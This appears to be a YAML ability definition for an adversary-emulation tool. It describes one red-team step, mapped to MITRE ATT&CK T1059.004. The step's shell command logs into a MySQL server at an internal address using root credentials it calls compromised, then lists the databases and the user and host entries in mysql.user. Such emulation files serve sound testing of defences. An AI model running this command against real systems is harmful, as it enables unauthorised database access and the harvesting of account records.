- id: ex04-mysql-exec
  name: MySQL Remote Command Execution
  description: Execute SQL queries on db-server-1 via compromised root credentials
  tactic: execution
  technique:
    attack_id: T1059.004
    name: Command and Scripting Interpreter - Unix Shell
  platforms:
    linux:
      sh:
        command: |
          mysql -h 10.0.20.30 -u root -proot -e 'SHOW DATABASES; SELECT user,host FROM mysql.user;' 2>/dev/null || echo 'MySQL exec attempted'

  singleton: false
  repeatable: false
